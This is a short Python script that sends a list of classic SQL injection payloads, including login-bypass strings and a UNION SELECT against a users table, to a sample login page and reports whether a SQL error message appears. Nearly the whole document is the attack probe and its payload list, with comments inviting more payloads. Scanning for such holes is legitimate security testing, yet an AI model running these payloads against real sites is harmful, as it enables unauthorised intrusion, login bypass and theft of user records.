import requests

def perform_sql_injection(url, payload):
    response = requests.get(url + payload)
    # Analyze the response to check for any indications of successful SQL injection
    # For example, you can check for error messages, modified content, or any unexpected behavior
    if "SQL syntax error" in response.text:
        print("[+] Possible SQL injection vulnerability detected!")
        print("Payload:", payload)
    else:
        print("[-] No SQL injection vulnerability detected for payload:", payload)

# Example usage
target_url = "https://example.com/login.php"
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
    "' UNION SELECT * FROM users --",
    # Add more SQL injection payloads as needed
]

for payload in sql_payloads:
    perform_sql_injection(target_url, payload)
